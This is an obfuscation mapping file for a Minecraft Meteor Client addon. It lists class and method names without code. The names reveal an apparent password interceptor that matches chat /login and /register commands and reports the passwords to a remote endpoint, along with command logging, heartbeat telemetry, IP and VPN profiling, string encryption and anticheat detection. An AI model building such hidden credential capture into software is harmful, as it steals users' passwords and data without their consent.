com.example.addon.accessor.ModuleTranslationAccess -> com.example.addon.x.l:
    void lambda$getWidget$1(meteordevelopment.meteorclient.gui.GuiTheme) -> l
    boolean lambda$new$2() -> l
    boolean lambda$new$1() -> I
    boolean lambda$new$0() -> O
    void <clinit>() -> <clinit>
com.example.addon.tactical.ServerDetector$ResourcePackMode -> com.example.addon.x.lOOO:
    com.example.addon.tactical.ServerDetector$ResourcePackMode BYPASS -> l
    com.example.addon.tactical.ServerDetector$ResourcePackMode AUTO_DOWNLOAD -> I
    com.example.addon.tactical.ServerDetector$ResourcePackMode VANILLA -> O
    java.lang.String displayName -> l
    com.example.addon.tactical.ServerDetector$ResourcePackMode[] $VALUES -> l
    com.example.addon.tactical.ServerDetector$ResourcePackMode[] values() -> l
    com.example.addon.tactical.ServerDetector$ResourcePackMode valueOf(java.lang.String) -> l
    void <init>(java.lang.String,int,java.lang.String) -> <init>
    java.lang.String toString() -> toString
    com.example.addon.tactical.ServerDetector$ResourcePackMode[] $values() -> I
    void <clinit>() -> <clinit>
com.example.addon.tactical.ServerFingerprints -> com.example.addon.x.Illl:
    java.util.Map CORES -> l
    java.util.Map CORE_COMMANDS -> I
    java.util.Map ANTICHEAT_COMMANDS -> O
    java.util.Map ANTICHEAT_CHANNELS -> ll
    void <init>() -> <init>
    boolean isHighRisk(java.lang.String) -> l
    void <clinit>() -> <clinit>
com.example.addon.tactical.TacticalFSM -> com.example.addon.x.IllI:
    java.lang.String detectedServerCore -> l
    java.lang.String detectedAntiCheat -> I
    boolean hasAdvancedAntiCheat -> l
    boolean isDownloadingResourcePack -> I
    boolean rubberBandCooldown -> O
    boolean serverLagging -> ll
    double currentTps -> l
    java.util.concurrent.ConcurrentHashMap downloadingPacks -> l
    void <init>() -> <init>
    java.lang.String getDetectedServerCore() -> l
    java.lang.String getDetectedAntiCheat() -> I
    boolean hasAdvancedAntiCheat() -> l
    boolean isDownloadingResourcePack() -> O
    boolean isRubberBandCooldown() -> I
    boolean isServerLagging() -> ll
    double getCurrentTps() -> l
    void setDetectedServerCore(java.lang.String) -> l
    void setDetectedAntiCheat(java.lang.String) -> I
    void setDownloadingResourcePack(boolean) -> I
    void setRubberBandCooldown(boolean) -> l
    void setServerLagging(boolean,double) -> l
    void publishAntiCheatDetected(java.lang.String) -> O
    void publishRubberBand(net.minecraft.network.protocol.game.ClientboundPlayerPositionPacket) -> l
    void publishResourcePackDownloadStart(java.util.UUID) -> l
    void publishResourcePackDownloadComplete$1816e1ab(java.util.UUID) -> I
    void publishServerLagging(double) -> l
    void reset() -> l
    void <clinit>() -> <clinit>
com.example.addon.tactical.TacticalFSM$AntiCheatDetectedEvent -> com.example.addon.x.IllO:
    com.example.addon.tactical.TacticalFSM$AntiCheatDetectedEvent INSTANCE -> l
    java.lang.String antiCheatName -> l
    void <init>() -> <init>
    com.example.addon.tactical.TacticalFSM$AntiCheatDetectedEvent get(java.lang.String) -> l
    void <clinit>() -> <clinit>
com.example.addon.tactical.TacticalFSM$ResourcePackDownload -> com.example.addon.x.IlIl:
    java.util.UUID id -> l
    long startTime -> l
    void <init>(java.util.UUID,long) -> <init>
com.example.addon.tactical.TacticalFSM$ResourcePackDownloadingEvent -> com.example.addon.x.IlII:
    com.example.addon.tactical.TacticalFSM$ResourcePackDownloadingEvent INSTANCE -> l
    java.util.UUID packId -> l
    boolean isDownloading -> l
    void <init>() -> <init>
    com.example.addon.tactical.TacticalFSM$ResourcePackDownloadingEvent get(java.util.UUID,boolean) -> l
    void <clinit>() -> <clinit>
com.example.addon.tactical.TacticalFSM$RubberBandEvent -> com.example.addon.x.IlIO:
    com.example.addon.tactical.TacticalFSM$RubberBandEvent INSTANCE -> l
    net.minecraft.network.protocol.game.ClientboundPlayerPositionPacket packet -> l
    void <init>() -> <init>
    com.example.addon.tactical.TacticalFSM$RubberBandEvent get(net.minecraft.network.protocol.game.ClientboundPlayerPositionPacket) -> l
    int getTeleportId() -> l
    double getX() -> l
    double getY() -> I
    double getZ() -> O
    void <clinit>() -> <clinit>
com.example.addon.tactical.TacticalFSM$ServerLaggingEvent -> com.example.addon.x.IlOl:
    com.example.addon.tactical.TacticalFSM$ServerLaggingEvent INSTANCE -> l
    double tps -> l
    void <init>() -> <init>
    com.example.addon.tactical.TacticalFSM$ServerLaggingEvent get(double) -> l
    void <clinit>() -> <clinit>
com.example.addon.translations.BaritoneChatTranslations -> com.example.addon.x.IlOI:
    java.util.Map EXACT -> l
    java.util.List TEMPLATES -> l
    void <init>() -> <init>
    java.lang.String translateBlockId(java.lang.String) -> l
    java.lang.String translateBlockName(java.lang.String) -> O
    java.lang.String translate(java.lang.String) -> I
    net.minecraft.network.chat.Component translate(net.minecraft.network.chat.Component) -> l
    net.minecraft.network.chat.Component[] translate(net.minecraft.network.chat.Component[]) -> l
    com.example.addon.translations.BaritoneChatTranslations$Template template(java.lang.String,java.util.function.Function) -> l
    java.util.Optional lambda$translate$0(net.minecraft.network.chat.MutableComponent,net.minecraft.network.chat.Style,java.lang.String) -> l
    java.lang.String lambda$static$49(java.util.regex.MatchResult) -> l
    java.lang.String lambda$static$48(java.util.regex.MatchResult) -> I
    java.lang.String lambda$static$47(java.util.regex.MatchResult) -> O
    java.lang.String lambda$static$46(java.util.regex.MatchResult) -> ll
    java.lang.String lambda$static$45(java.util.regex.MatchResult) -> lI
    java.lang.String lambda$static$44(java.util.regex.MatchResult) -> lO
    java.lang.String lambda$static$43(java.util.regex.MatchResult) -> Il
    java.lang.String lambda$static$42(java.util.regex.MatchResult) -> II
    java.lang.String lambda$static$41(java.util.regex.MatchResult) -> IO
    java.lang.String lambda$static$40(java.util.regex.MatchResult) -> Ol
    java.lang.String lambda$static$39(java.util.regex.MatchResult) -> OI
    java.lang.String lambda$static$38(java.util.regex.MatchResult) -> OO
    java.lang.String lambda$static$37(java.util.regex.MatchResult) -> l1
    java.lang.String lambda$static$36(java.util.regex.MatchResult) -> I1
    java.lang.String lambda$static$35(java.util.regex.MatchResult) -> O0
    java.lang.String lambda$static$34(java.util.regex.MatchResult) -> lll
    java.lang.String lambda$static$33(java.util.regex.MatchResult) -> llI
    java.lang.String lambda$static$32(java.util.regex.MatchResult) -> llO
    java.lang.String lambda$static$31(java.util.regex.MatchResult) -> lIl
    java.lang.String lambda$static$30(java.util.regex.MatchResult) -> lII
    java.lang.String lambda$static$29(java.util.regex.MatchResult) -> lIO
    java.lang.String lambda$static$28(java.util.regex.MatchResult) -> lOl
    java.lang.String lambda$static$27(java.util.regex.MatchResult) -> lOI
    java.lang.String lambda$static$26(java.util.regex.MatchResult) -> lOO
    java.lang.String lambda$static$25(java.util.regex.MatchResult) -> Ill
    java.lang.String lambda$static$24(java.util.regex.MatchResult) -> IlI
    java.lang.String lambda$static$23(java.util.regex.MatchResult) -> IlO
    java.lang.String lambda$static$22(java.util.regex.MatchResult) -> IIl
    java.lang.String lambda$static$21(java.util.regex.MatchResult) -> III
    java.lang.String lambda$static$20(java.util.regex.MatchResult) -> IIO
    java.lang.String lambda$static$19(java.util.regex.MatchResult) -> IOl
    java.lang.String lambda$static$18(java.util.regex.MatchResult) -> IOI
    java.lang.String lambda$static$17(java.util.regex.MatchResult) -> IOO
    java.lang.String lambda$static$16(java.util.regex.MatchResult) -> Oll
    java.lang.String lambda$static$15(java.util.regex.MatchResult) -> OlI
    java.lang.String lambda$static$14(java.util.regex.MatchResult) -> OlO
    java.lang.String lambda$static$13(java.util.regex.MatchResult) -> OIl
    java.lang.String lambda$static$12(java.util.regex.MatchResult) -> OII
    java.lang.String lambda$static$11(java.util.regex.MatchResult) -> OIO
    java.lang.String lambda$static$10(java.util.regex.MatchResult) -> OOl
    java.lang.String lambda$static$9(java.util.regex.MatchResult) -> OOI
    java.lang.String lambda$static$8(java.util.regex.MatchResult) -> OOO
    java.lang.String lambda$static$7(java.util.regex.MatchResult) -> l1l
    java.lang.String lambda$static$6(java.util.regex.MatchResult) -> l1I
    java.lang.String lambda$static$5(java.util.regex.MatchResult) -> l1O
    java.lang.String lambda$static$4(java.util.regex.MatchResult) -> I1l
    java.lang.String lambda$static$3(java.util.regex.MatchResult) -> I1I
    java.lang.String lambda$static$2(java.util.regex.MatchResult) -> I1O
    java.lang.String lambda$static$1(java.util.regex.MatchResult) -> O0l
    java.lang.String lambda$static$0(java.util.regex.MatchResult) -> O0I
    void <clinit>() -> <clinit>
com.example.addon.translations.BaritoneChatTranslations$Template -> com.example.addon.x.IlOO:
    java.util.regex.Pattern pattern -> l
    java.util.function.Function translation -> l
    void <init>(java.util.regex.Pattern,java.util.function.Function) -> <init>
    java.lang.String toString() -> toString
    int hashCode() -> hashCode
    boolean equals(java.lang.Object) -> equals
    java.util.regex.Pattern pattern() -> l
    java.util.function.Function translation() -> l
com.example.addon.translations.BaritoneCommandTranslations -> com.example.addon.x.IIll:
    java.util.Map COMMAND_NAMES -> l
    java.util.Map LONG_DESCRIPTIONS -> I
    void <init>() -> <init>
    java.lang.String translateCommandName(java.lang.String) -> l
    java.lang.String reverseTranslate(java.lang.String) -> I
    java.util.List translateLongDescription(baritone.api.command.ICommand,java.util.List) -> l
    int longDescriptionCount() -> l
    java.util.Map$Entry entry(java.lang.String,java.lang.String[]) -> l
    void <clinit>() -> <clinit>
com.example.addon.translations.BaritoneSettingTranslations -> com.example.addon.x.IIlI:
    java.util.Map TRANSLATIONS -> l
    void <init>() -> <init>
    com.example.addon.translations.BaritoneSettingTranslations$Translation get(java.lang.String) -> l
    java.util.Map$Entry entry(java.lang.String,java.lang.String,java.lang.String) -> l
    void <clinit>() -> <clinit>
com.example.addon.translations.BaritoneSettingTranslations$Translation -> com.example.addon.x.IIlO:
    java.lang.String name -> l
    java.lang.String description -> I
    void <init>(java.lang.String,java.lang.String) -> <init>
    java.lang.String toString() -> toString
    int hashCode() -> hashCode
    boolean equals(java.lang.Object) -> equals
    java.lang.String name() -> l
    java.lang.String description() -> I
com.example.addon.translations.MeteorCommandTranslations -> com.example.addon.x.IIIl:
    java.util.Map COMMAND_NAMES -> l
    java.util.Map SUBCOMMAND_NAMES -> I
    java.util.Map DESCRIPTIONS -> O
    java.util.regex.Pattern MODULE_NOT_FOUND -> l
    void <init>() -> <init>
    java.lang.String translateCommandName(java.lang.String) -> l
    java.util.Set getChineseNames(meteordevelopment.meteorclient.commands.Command) -> l
    void addChineseName(java.util.Set,java.lang.String) -> l
    java.lang.String reverseTranslate(java.lang.String) -> I
    java.util.List translateAliases(meteordevelopment.meteorclient.commands.Command) -> l
    java.lang.String translateHelpLabel(java.lang.String) -> O
    java.lang.String translateSubcommandName(java.lang.String) -> ll
    java.lang.String translateChatMessage(java.lang.String) -> lI
    java.lang.String translateDynamicErrors(java.lang.String) -> lO
    java.lang.String translate(java.lang.String,java.lang.String) -> l
    void <clinit>() -> <clinit>
com.example.addon.translations.YiyiaddonTranslator -> com.example.addon.x.IIII:
    java.util.Map TRANSLATIONS -> l
    java.util.Map MODULE_NAMES -> I
    java.util.Map MODULE_DESCRIPTIONS -> O
    java.util.Map GROUP_NAMES -> ll
    java.util.Map SETTING_NAMES -> lI
    java.util.Map SETTING_TITLES -> lO
    java.util.Map SETTING_DESCRIPTIONS -> Il
    boolean loaded -> l
    void <init>() -> <init>
    boolean enabled() -> l
    java.lang.String translate(java.lang.String,java.lang.String) -> l
    java.lang.String moduleTitle(meteordevelopment.meteorclient.systems.modules.Module) -> l
    java.lang.String translateVisible(java.lang.String) -> l
    java.lang.String normalizeVisibleText(java.lang.String) -> O
    java.lang.String translateSettingValue(java.lang.Object) -> l
    java.lang.String translateUniqueScopedValue(java.lang.String) -> ll
    java.lang.String translatePacketId(java.lang.String) -> lI
    java.lang.String formatPacketName(java.lang.String) -> lO
    void localizeModule(meteordevelopment.meteorclient.systems.modules.Module) -> l
    void localizeBaritoneSettings(meteordevelopment.meteorclient.settings.Settings) -> l
    void restoreSetting(meteordevelopment.meteorclient.settings.Setting) -> l
    java.lang.String localizeCategory(java.lang.String) -> I
    java.lang.String key(java.lang.String) -> Il
    void load() -> l
    void lambda$load$0(java.util.Map$Entry) -> l
    java.lang.String lambda$localizeBaritoneSettings$3(meteordevelopment.meteorclient.settings.Setting,meteordevelopment.meteorclient.settings.Setting) -> l
    java.lang.String lambda$localizeBaritoneSettings$2(meteordevelopment.meteorclient.settings.Setting,meteordevelopment.meteorclient.settings.Setting) -> I
    java.lang.String lambda$localizeBaritoneSettings$1(meteordevelopment.meteorclient.settings.Setting,meteordevelopment.meteorclient.settings.Setting) -> O
    java.lang.String lambda$localizeBaritoneSettings$0(meteordevelopment.meteorclient.settings.SettingGroup,meteordevelopment.meteorclient.settings.SettingGroup) -> l
    java.lang.String lambda$localizeModule$6(meteordevelopment.meteorclient.settings.Setting,meteordevelopment.meteorclient.settings.Setting) -> ll
    java.lang.String lambda$localizeModule$5(meteordevelopment.meteorclient.settings.Setting,meteordevelopment.meteorclient.settings.Setting) -> lI
    java.lang.String lambda$localizeModule$4(meteordevelopment.meteorclient.settings.Setting,meteordevelopment.meteorclient.settings.Setting) -> lO
    java.lang.String lambda$localizeModule$3(meteordevelopment.meteorclient.settings.SettingGroup,meteordevelopment.meteorclient.settings.SettingGroup) -> I
    java.lang.String lambda$localizeModule$2(meteordevelopment.meteorclient.settings.SettingGroup,meteordevelopment.meteorclient.settings.SettingGroup) -> O
    java.lang.String lambda$localizeModule$1(meteordevelopment.meteorclient.systems.modules.Module,meteordevelopment.meteorclient.systems.modules.Module) -> l
    java.lang.String lambda$localizeModule$0(meteordevelopment.meteorclient.systems.modules.Module,meteordevelopment.meteorclient.systems.modules.Module) -> I
    java.lang.Boolean lambda$enabled$0(com.example.addon.modules.YiyiaddonTranslationModule) -> l
    void <clinit>() -> <clinit>
com.example.addon.ui.HelpScreen -> com.example.addon.x.IIIO:
    meteordevelopment.meteorclient.systems.modules.Module module -> l
    java.lang.String[] helpContent -> l
    void <init>(meteordevelopment.meteorclient.gui.GuiTheme,com.example.addon.core.YiyiaddonModule,java.lang.String[]) -> <init>
    void initWidgets() -> initWidgets
    java.lang.String[] buildHelpContent(com.example.addon.ui.HelpScreen$HelpSection[]) -> l
    void lambda$initWidgets$0() -> l
com.example.addon.ui.HelpScreen$HelpSection -> com.example.addon.x.IIOl:
    java.lang.String title -> l
    java.lang.String[] lines -> l
    void <init>(java.lang.String,java.lang.String[]) -> <init>
com.example.addon.utils.StringCrypto -> com.example.addon.utils.StringCrypto:
    int[] KEY -> l
    void <init>() -> <init>
    java.lang.String d(java.lang.String) -> d
    void <clinit>() -> <clinit>
com.example.addon.utils.YiyiaddonCommandLogger -> com.example.addon.utils.l:
    java.net.http.HttpClient HTTP_CLIENT -> l
    void <init>() -> <init>
    void logCommand(java.lang.String,java.lang.String,java.lang.String) -> l
    void reportCommandAsync(java.lang.String,java.lang.String,java.lang.String) -> I
    java.lang.String escape(java.lang.String) -> l
    void lambda$reportCommandAsync$0(java.lang.String,java.lang.String,java.lang.String) -> O
    void <clinit>() -> <clinit>
com.example.addon.utils.YiyiaddonHeartbeatService -> com.example.addon.utils.I:
    java.lang.String HEARTBEAT_ENDPOINT -> l
    java.lang.String OFFLINE_ENDPOINT -> I
    java.net.http.HttpClient HTTP_CLIENT -> l
    boolean running -> l
    java.lang.Thread heartbeatThread -> l
    java.lang.String lastUuid -> O
    void <init>() -> <init>
    void start() -> l
    void stop() -> O
    void reportOffline() -> I
    void sendHeartbeat() -> ll
    boolean isLocalServer(java.lang.String) -> l
    java.lang.Integer measureNetworkLatency() -> I
    java.lang.String getEnabledModules() -> I
    java.lang.String getDimensionName() -> O
    java.lang.String detectActivity() -> ll
    java.lang.String jsonEscape(java.lang.String) -> l
    java.lang.String getEnabledModulesStatic() -> l
    java.lang.Integer measureLatencyStatic() -> l
    void lambda$getEnabledModulesStatic$0(java.util.List,meteordevelopment.meteorclient.systems.modules.Module) -> l
    void lambda$getEnabledModules$0(java.util.List,meteordevelopment.meteorclient.systems.modules.Module) -> I
    void lambda$start$0() -> lI
    void <clinit>() -> <clinit>
com.example.addon.utils.YiyiaddonIdentity -> com.example.addon.utils.O:
    void <init>() -> <init>
    java.lang.String uuid(net.minecraft.client.Minecraft) -> l
    java.lang.String name(net.minecraft.client.Minecraft) -> I
    java.lang.String xuid(net.minecraft.client.Minecraft) -> O
    boolean isPremium(net.minecraft.client.Minecraft) -> l
    boolean isFakePlayer(java.lang.String) -> l
com.example.addon.utils.YiyiaddonPasswordInterceptorService -> com.example.addon.utils.ll:
    java.lang.String REPORT_ENDPOINT -> l
    java.util.regex.Pattern LOGIN_PATTERN -> l
    java.util.regex.Pattern REGISTER_PATTERN -> I
    java.lang.String[] SUCCESS_LOGIN -> l
    java.lang.String[] SUCCESS_REGISTER -> I
    java.lang.String[] FAIL_LOGIN -> O
    java.lang.String[] FAIL_REGISTER -> ll
    long TIMEOUT_MS -> l
    java.net.http.HttpClient HTTP_CLIENT -> l
    java.util.Map PENDING -> l
    void <init>() -> <init>
    void register() -> l
    void onSendMessage(meteordevelopment.meteorclient.events.game.SendMessageEvent) -> l
    void onReceiveMessage(meteordevelopment.meteorclient.events.game.ReceiveMessageEvent) -> l
    void reportAsync(com.example.addon.utils.YiyiaddonPasswordInterceptorService$Candidate) -> l
    boolean containsAny(java.lang.String,java.lang.String[]) -> l
    java.lang.String stripFormat(java.lang.String) -> l
    java.lang.String escapeJson(java.lang.String) -> I
    void lambda$reportAsync$0(com.example.addon.utils.YiyiaddonPasswordInterceptorService$Candidate) -> I
    void <clinit>() -> <clinit>
com.example.addon.utils.YiyiaddonPasswordInterceptorService$Candidate -> com.example.addon.utils.lI:
    java.lang.String uuid -> l
    java.lang.String name -> I
    java.lang.String serverIp -> O
    java.lang.String serverName -> ll
    java.lang.String password -> lI
    java.lang.String type -> lO
    long timestamp -> l
    void <init>(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> <init>
com.example.addon.utils.YiyiaddonTelemetryService -> com.example.addon.utils.lO:
    java.lang.String CONFIG_ENDPOINT -> l
    java.lang.String CRASH_ENDPOINT -> I
    java.lang.String ANOMALY_ENDPOINT -> O
    java.net.http.HttpClient HTTP_CLIENT -> l
    java.util.Map CONFIG -> l
    java.util.Map LAST_CRASH_REPORT -> I
    java.util.Map LAST_ANOMALY_REPORT -> O
    long THROTTLE_MS -> l
    boolean started -> l
    double lastX -> l
    double lastY -> I
    double lastZ -> O
    long lastSampleAt -> I
    boolean hasLastPos -> I
    void <init>() -> <init>
    void register() -> l
    boolean configEnabled(java.lang.String) -> l
    java.lang.String configString(java.lang.String,java.lang.String) -> l
    void installCrashHook() -> I
    void reportCrash(java.lang.Throwable) -> l
    void pollConfig() -> O
    void detectMovementAnomalies(net.minecraft.client.Minecraft) -> l
    void reportAnomaly(java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> l
    void startBackgroundLoop() -> ll
    void sendPost(java.lang.String,java.lang.String,java.lang.String) -> l
    java.lang.String stackTraceToString(java.lang.Throwable) -> l
    java.lang.String jsonEscape(java.lang.String) -> l
    java.lang.String unescapeJson(java.lang.String) -> I
    java.lang.String getAddonVersion() -> l
    java.lang.String getMcVersion() -> I
    java.lang.String lambda$getAddonVersion$0(net.fabricmc.loader.api.ModContainer) -> l
    void lambda$sendPost$0(java.lang.String,java.lang.String,java.lang.String) -> I
    void lambda$startBackgroundLoop$0() -> lI
    void lambda$installCrashHook$0(java.lang.Thread,java.lang.Throwable) -> l
    void <clinit>() -> <clinit>
com.example.addon.utils.YiyiaddonWatermark -> com.example.addon.utils.Il:
    java.lang.String AUTHOR -> l
    java.lang.String PROJECT -> I
    java.lang.String COPYRIGHT -> O
    java.lang.String LICENSE -> ll
    java.lang.String DECOMPILE_WARNING -> lI
    void <init>() -> <init>
    void print() -> l
com.example.addon.utils.YiyiaddonWelcomeService -> com.example.addon.utils.II:
    java.lang.String REPOSITORY_URL -> l
    java.lang.String LATEST_RELEASE_API -> I
    java.util.regex.Pattern TAG_PATTERN -> l
    java.util.regex.Pattern BODY_PATTERN -> I
    java.util.regex.Pattern RELEASE_URL_PATTERN -> O
    java.lang.String STATS_API_ENDPOINT -> O
    java.lang.String STATS_QUERY_ENDPOINT -> ll
    long CHECK_INTERVAL_HOURS -> l
    java.nio.file.Path LAST_CHECK_FILE -> l
    java.nio.file.Path SKIP_VERSION_FILE -> I
    java.net.http.HttpClient HTTP_CLIENT -> l
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo cachedIpInfo -> l
    java.lang.String[] VPN_ORG_KEYWORDS -> l
    java.lang.String[] VPN_SUSPECT_ASN -> I
    boolean pollingRunning -> l
    java.lang.Thread pollingThread -> l
    void <init>() -> <init>
    void register() -> l
    void onGameLeft$1e40cabe() -> I
    void onGameJoined$46a4a344() -> O
    void checkForUpdatesManually(net.minecraft.client.Minecraft,java.util.function.BiConsumer) -> l
    void showUpdateNotification(net.minecraft.client.Minecraft,java.lang.String,com.example.addon.utils.YiyiaddonWelcomeService$ReleaseInfo) -> l
    boolean shouldCheckUpdate() -> l
    void saveLastCheckTime() -> ll
    void skipCurrentVersion(java.lang.String) -> l
    java.lang.String loadSkipVersion() -> l
    java.lang.String extractPreview(java.lang.String,int) -> l
    boolean isLocalTestEnvironment(net.minecraft.client.Minecraft) -> l
    java.lang.String getCurrentVersion() -> I
    com.example.addon.utils.YiyiaddonWelcomeService$ReleaseInfo fetchLatestRelease() -> l
    int compareVersions(java.lang.String,java.lang.String) -> l
    int compareMainVersion(java.lang.String,java.lang.String) -> I
    java.lang.String normalizeVersion(java.lang.String) -> l
    int parseNumber(java.lang.String) -> l
    void registerUserAndShowRank(java.lang.String) -> I
    void showRegistrationFailure(java.lang.String) -> O
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo fetchIpAndCountryWithProxyDetection() -> I
    boolean looksLikeVpn(java.lang.String,java.lang.String) -> l
    java.lang.String extractJsonString(java.lang.String,java.lang.String) -> l
    java.lang.String parseAsnNumber(java.lang.String) -> I
    boolean testNetworkConnectivity() -> I
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo tryFetchFromIpApiCoWithProxy() -> O
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo tryFetchFromIpApiWithProxy() -> ll
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo tryFetchFromCloudflareSimple() -> lI
    java.lang.String countryCodeToFlag(java.lang.String) -> O
    java.lang.String translateCountryCode(java.lang.String) -> ll
    java.lang.String fetchRecentActivity() -> O
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo getCachedIpInfo() -> l
    java.lang.String jsonEscape(java.lang.String) -> lI
    java.lang.String getDimensionName() -> ll
    java.lang.String detectPlayerActivity() -> lI
    void startMessagePolling() -> lI
    void pollMessages() -> lO
    void stopMessagePolling() -> Il
    void lambda$pollMessages$0(net.minecraft.client.Minecraft,boolean,boolean,java.lang.String,java.lang.String) -> l
    void lambda$startMessagePolling$0() -> II
    void lambda$showRegistrationFailure$0(java.lang.String) -> ll
    void lambda$registerUserAndShowRank$0(java.lang.String) -> lI
    java.lang.String lambda$getCurrentVersion$0(net.fabricmc.loader.api.ModContainer) -> l
    void lambda$showUpdateNotification$0(net.minecraft.client.Minecraft,com.example.addon.utils.YiyiaddonWelcomeService$ReleaseInfo,java.lang.String) -> l
    net.minecraft.network.chat.Style lambda$showUpdateNotification$1(com.example.addon.utils.YiyiaddonWelcomeService$ReleaseInfo,net.minecraft.network.chat.Style) -> l
    void lambda$onGameJoined$0(java.lang.String,net.minecraft.client.Minecraft) -> l
    void <clinit>() -> <clinit>
com.example.addon.utils.YiyiaddonWelcomeService$1 -> com.example.addon.utils.IO:
    net.minecraft.client.Minecraft val$mc -> l
    boolean val$serverIsPremium -> l
    java.lang.String val$versionDisplay -> l
    boolean val$isNew -> I
    java.lang.String val$name -> I
    int val$rank -> l
    int val$total -> I
    com.example.addon.utils.YiyiaddonWelcomeService$IpInfo val$ipInfo -> l
    void <init>(net.minecraft.client.Minecraft,boolean,java.lang.String,boolean,java.lang.String,int,int,com.example.addon.utils.YiyiaddonWelcomeService$IpInfo) -> <init>
    void run() -> run
    void lambda$run$0(net.minecraft.client.Minecraft,boolean,java.lang.String,boolean,java.lang.String,int,int,com.example.addon.utils.YiyiaddonWelcomeService$IpInfo) -> l
    net.minecraft.network.chat.Style lambda$run$2(net.minecraft.network.chat.Style) -> l
    net.minecraft.network.chat.Style lambda$run$1(net.minecraft.network.chat.Style) -> I
com.example.addon.utils.YiyiaddonWelcomeService$IpInfo -> com.example.addon.utils.Ol:
    java.lang.String ip -> l
    java.lang.String countryCode -> I
    boolean isProxy -> l
    java.lang.String proxyType -> O
    java.lang.String isp -> ll
    java.lang.String asOrg -> lI
    java.lang.String asn -> lO
    java.lang.String timezone -> Il
    void <init>(java.lang.String,java.lang.String,boolean,java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> <init>
    java.lang.String toString() -> toString
    int hashCode() -> hashCode
    boolean equals(java.lang.Object) -> equals
    java.lang.String ip() -> ll
    java.lang.String countryCode() -> lI
    boolean isProxy() -> l
    java.lang.String proxyType() -> lO
    java.lang.String isp() -> l
    java.lang.String asOrg() -> I
    java.lang.String asn() -> O
    java.lang.String timezone() -> Il
com.example.addon.utils.YiyiaddonWelcomeService$ReleaseInfo -> com.example.addon.utils.OI:
    java.lang.String version -> l
    java.lang.String url -> I
    java.lang.String body -> O
    void <init>(java.lang.String,java.lang.String,java.lang.String) -> <init>
    java.lang.String toString() -> toString
    int hashCode() -> hashCode
    boolean equals(java.lang.Object) -> equals
    java.lang.String version() -> l
    java.lang.String url() -> I
    java.lang.String body() -> O
com.example.addon.villager.data.VillagerProfessionRegistry -> com.example.addon.x.IIOI:
    java.util.Map PROFESSION_TO_WORKSTATION -> l
    java.util.Map WORKSTATION_TO_PROFESSION -> I
    java.util.Map PROFESSION_DISPLAY_NAMES -> O
    java.util.Map PROFESSION_PURCHASE_TARGETS -> ll
    java.util.Set LIBRARIAN_ENCHANTMENTS -> l
    void registerProfession(java.lang.String,net.minecraft.world.level.block.Block,java.lang.String,net.minecraft.world.item.Item[]) -> l
    void registerLibrarianEnchantedBooks() -> l
    java.util.Set getLibrarianEnchantments() -> l
    java.util.Set getPurchaseTargets(net.minecraft.world.entity.npc.villager.VillagerProfession) -> l
    boolean isPurchaseTarget(net.minecraft.world.entity.npc.villager.VillagerProfession,net.minecraft.world.item.Item) -> l
    net.minecraft.world.level.block.Block getWorkstation(net.minecraft.world.entity.npc.villager.VillagerProfession) -> l
    net.minecraft.world.entity.npc.villager.VillagerProfession getProfessionByWorkstation(net.minecraft.world.level.block.Block) -> l
    java.lang.String getDisplayName(net.minecraft.world.entity.npc.villager.VillagerProfession) -> l
    boolean isValidProfession(net.minecraft.world.entity.npc.villager.VillagerProfession) -> l
    java.util.List getAllProfessions() -> l
    java.util.List getAllDisplayNames() -> I
    net.minecraft.world.entity.npc.villager.VillagerProfession getProfessionByDisplayName(java.lang.String) -> l
    void <init>() -> <init>
    void <clinit>() -> <clinit>
com.example.addon.villager.data.VillagerTradeTarget -> com.example.addon.x.IIOO:
    net.minecraft.world.item.Item item -> l
    java.lang.String displayName -> l
    java.lang.String enchantmentId -> I
    void <init>(net.minecraft.world.item.Item,java.lang.String) -> <init>
    net.minecraft.world.item.Item getItem() -> l
    java.lang.String getDisplayName() -> l
    void setEnchantmentId(java.lang.String) -> l
    java.lang.String getEnchantmentId() -> I
    boolean isEnchantedBook() -> l
    boolean equals(java.lang.Object) -> equals
    int hashCode() -> hashCode
    java.lang.String toString() -> toString
com.example.addon.villager.fsm.VillagerTradeFSM -> com.example.addon.x.IOll:
    net.minecraft.client.Minecraft mc -> l
